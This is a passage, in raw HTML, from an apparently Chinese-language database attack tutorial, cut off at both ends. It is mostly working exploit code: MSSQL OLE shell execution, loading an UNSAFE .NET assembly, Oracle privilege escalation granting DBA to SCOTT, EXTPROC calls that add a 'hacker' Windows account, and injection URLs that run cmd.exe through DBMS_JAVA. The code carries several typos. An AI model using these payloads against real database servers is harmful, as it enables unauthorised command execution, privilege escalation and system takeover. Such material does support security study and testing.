&lt;span class=&#34;token keyword&#34;&gt;IF&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@OLEResult&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;RAISERROR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;CreateObject0X&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;14&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@OLEResult&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXECUTE&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@OLEResult&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; sp_OAMethod &lt;span class=&#34;token variable&#34;&gt;@ShellID&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Run&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;Null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@cmd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@wait&lt;/span&gt; 
&lt;span class=&#34;token keyword&#34;&gt;IF&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@OLEResult&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@result&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@OLEResult&lt;/span&gt; 
&lt;span class=&#34;token keyword&#34;&gt;IF&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@OLEResult&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;RAISERROR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Run8OX&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;14&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@OLEResult&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;--If @OLEResult &amp;lt;&amp;gt; 0 EXEC sp_displayoaerrorinfo @shellID, @OLEResult &lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXECUTE&lt;/span&gt; QOLEResult &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; sp_OADestroy &lt;span class=&#34;token variable&#34;&gt;@ShellID&lt;/span&gt; 
&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@result&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;使用CREATE ASSEMBLY指令促使SQL Server从系统中加载文件。如果想使用该功能加载一个有效的.NET二进制文件，有三种选择：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;创建并加载本地可执行文件：&lt;/p&gt;
&lt;p&gt;在系统中创建源文件； 将源文件编译为可执行文件； 从 C:\temp\foo.dll 调用 CREATE ASSEMBLY FOO。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;从UNC共享加载可执行文件：&lt;/p&gt;
&lt;p&gt;在公共访问的Windows共享中创建DLL(或EXE)； 从\public_server\temp\fbo.dll 调用 CREATE ASSEMBLYFOO。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;从传递的字符串创建可执行文件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;创建可执行文件。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;将可执行文件分解成HEX：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;File&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;moo.dll&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;rb&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;unpack&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;H*&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&#34;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;d5a90000300000004000000ffff0&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;从 4d5a90000300000004000000ffff0 调用CREATE ASSEMBLY MOO&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;NET提供的信任级别&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;SAFE：
＞执行计算
＞禁止访问外部资源
EXTERNAL_ACCESS:
＞访问硬盘
＞访问环境
＞带某些限制的几乎完全的访问
UNSAFE：
＞等价于完全信任
＞调用非托管代码
＞以SYSTEM身份做任何事情&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;我们的目标是以UNSAFE级别加载二进制文件。将数据库设置为“Trustworthy”可以绕开这种限制。&lt;/p&gt;
&lt;p&gt;不受限制地创建一个.NET二进制文件，然后使用设置为UNSAFE的许可将其导入到系统中&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;alter&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;database&lt;/span&gt; master &lt;span class=&#34;token keyword&#34;&gt;set&lt;/span&gt; Trustworthy &lt;span class=&#34;token keyword&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; ASSEMELY shoe &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; Ox4d5a90&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WITH&lt;/span&gt; PERMISSION_SET&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;unsafe&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;Oracle-7&#34;&gt;&lt;a href=&#34;#Oracle-7&#34; class=&#34;headerlink&#34; title=&#34;Oracle&#34;&gt;&lt;/a&gt;Oracle&lt;/h4&gt;&lt;p&gt;代码的执行通常要求数据库用户具有DBA权限&lt;/p&gt;
&lt;h5 id=&#34;权限提升&#34;&gt;&lt;a href=&#34;#权限提升&#34; class=&#34;headerlink&#34; title=&#34;权限提升&#34;&gt;&lt;/a&gt;权限提升&lt;/h5&gt;&lt;p&gt;特定的PL/SQL块(比如函数、存储过程、触发器、 视图等)都是在特定的权限之下才能执行&lt;/p&gt;
&lt;p&gt;Oracle带有许多默认的安装包，这些包中包含了大量的对象(表、视 图、函数、过程等等)，SYS具有最高级别的访问权限，在SYS权限下执行SQL语句就能赋予自己DAB角色。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#以一个非特权用户test连接到数据库&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;#创建一个函数并注入易受攻击的过程&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;REPLACE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FUNCTION&lt;/span&gt; X &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; varchar2
authid &lt;span class=&#34;token keyword&#34;&gt;current_user&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; 
pragna autononous_transaction&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;token keyword&#34;&gt;BEGIN&lt;/span&gt; 
&lt;span class=&#34;token keyword&#34;&gt;EXECUTE&lt;/span&gt; IMMEDIATE &lt;span class=&#34;token string&#34;&gt;&#39;GRANT DBA TO SCOTT&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;token keyword&#34;&gt;COMMIT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;token keyword&#34;&gt;RETURN&lt;/span&gt; 
&lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;exec&lt;/span&gt; SYS&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;LT&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;CREATEVORKSPACE&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;zz&#39;&#39; and scott.x&amp;lt;&amp;gt;=&#39;&#39;x&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;exec&lt;/span&gt; SYS&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;LT&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;RENOUEWORKSPACE&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;zz&#39;&#39; and scott.x&amp;lt;&amp;gt;=&#39;&#39;x&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; user_role_privs&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#可以看到SCOTT具有DBA角色&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#具有 CREATE ANY PROCEDURE 和 EXECUTE ANY PROCEDURE 权限的用户可以在SYSTEM模式下创建一个存储过程：&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;REPLACE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;procedure&lt;/span&gt; SYSTEM&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;DBATEST
&lt;span class=&#34;token operator&#34;&gt;IS&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;BEGIN&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXECUTE&lt;/span&gt; IMMEDIATE &lt;span class=&#34;token string&#34;&gt;&#39;GRANT DBA TO SCOTT&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; SYSTEM&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;DBATEST&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;通过直接访问执行代码&#34;&gt;&lt;a href=&#34;#通过直接访问执行代码&#34; class=&#34;headerlink&#34; title=&#34;通过直接访问执行代码&#34;&gt;&lt;/a&gt;通过直接访问执行代码&lt;/h5&gt;&lt;p&gt;如果可以直接访问Oracle实例，那么根据Oracle版本的不同，可以使用下列多种不同的方法。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Oracle EXTPROC&lt;/code&gt;、&lt;code&gt;Java&lt;/code&gt;、&lt;code&gt;DBMS_SCHEDULER&lt;/code&gt;是Oracle运行操作系统命令的正式方法。&lt;/p&gt;
&lt;p&gt;使用Oracle数据库中的其他功能来执行操作系统代码，包括&lt;code&gt;PL/SQL native&lt;/code&gt;、&lt;code&gt;Oracle Text&lt;/code&gt; 、&lt;code&gt;Alter System set 事件&lt;/code&gt;、&lt;code&gt;PL/SQL native 9i&lt;/code&gt;、&lt;code&gt;Buffer overflow（缓冲区溢出）+ shell代码&lt;/code&gt;、&lt;code&gt;Custom code（自定义代码）&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;Oracle EXTPROC&lt;/code&gt;和&lt;code&gt;Java&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql&#34;&gt;http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;Oracle EXTPROC&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Oracle数据库的PL/SQL程序设计语言可以通过EXTPROC执行外部过程&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#恶意用户首先创建一个共享对象(shared object)—通常是DLL文件或系统库，其中包含了允许执行OS代码的功能：&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 对于Windows系统&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;REPLACE&lt;/span&gt; LIBRARY exec_shell &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;C:\windows\system32\msvcrt.dll&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 对于UNIX系统&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;REPLACE&lt;/span&gt; LIBRARY exec_shell &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/lib/libc-2.2.5.so&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;#创建一个过程，调用该库的系统函数：&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;REPLACE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;procedure&lt;/span&gt; oraexec&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;cmdstring &lt;span class=&#34;token operator&#34;&gt;IN&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;CHAR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;is&lt;/span&gt; external NAME &lt;span class=&#34;token string&#34;&gt;&#34;system&#34;&lt;/span&gt;
library exec_shell
&lt;span class=&#34;token keyword&#34;&gt;LANGUAGE&lt;/span&gt; C&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;#执行该过程：&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;exec&lt;/span&gt; oraexec&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;net user hacker hack3r /ADD&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#当执行oraexec过程时，数据库指示EXTPROC加载msvcrt.dll或libc库，并执行system()函数。&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;通过Java库执行操作系统命令&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#查看用户Java(文件和执行)的许可权限：&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; user_java_policy &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; grantee_name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;SCOTT&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;数据库用户具有正确的Java IO许可权限，执行OS代码的方法&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#DBMS_JAVA.RUNJAVA(受影响的系统：11g R1、11g R2)：&lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//192.168.2.10/ora8.php?name=SCOTT&#39; and (SELECT DBMS_JAVA.RUNJAVA(&#39;oracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c dir&amp;gt;C:\\OUT.LST&#39;) FROM DUAL) is not null -- &lt;/span&gt;

&lt;span class=&#34;token string&#34;&gt;&#39;
#DBMS_JAVA_TEST.FUNCALL(受影响的系统：9iR2、10g R2、11g R1、11g R2)：
http://192.168.2.10/ora8.php?name=SCOTT&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;Select&lt;/span&gt; DBMS_JAVA_TEST&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;FUNCALL&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;oracle/aurora/util/Wrapper &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;main&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;c:\\windows\\system32\\cmd.exe&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/c&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;dir&amp;gt;c:\\OUT2.LST&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; DUAL&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;null&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# DBMS_JVM_EXP_PERMS允许具有CREATE SESSION权限的用户授予自己Java IO许可权限：&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;DECLARE&lt;/span&gt; POL DBMS_JVM_EXP_PERMS&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;TEMP_JAVA_POLICY&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;CURSOR&lt;/span&gt; Cl &lt;span class=&#34;token operator&#34;&gt;IS&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;GRANT&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;SYS&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;io&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;FilePermission&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;ALL&lt;/span&gt; FI LES&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token 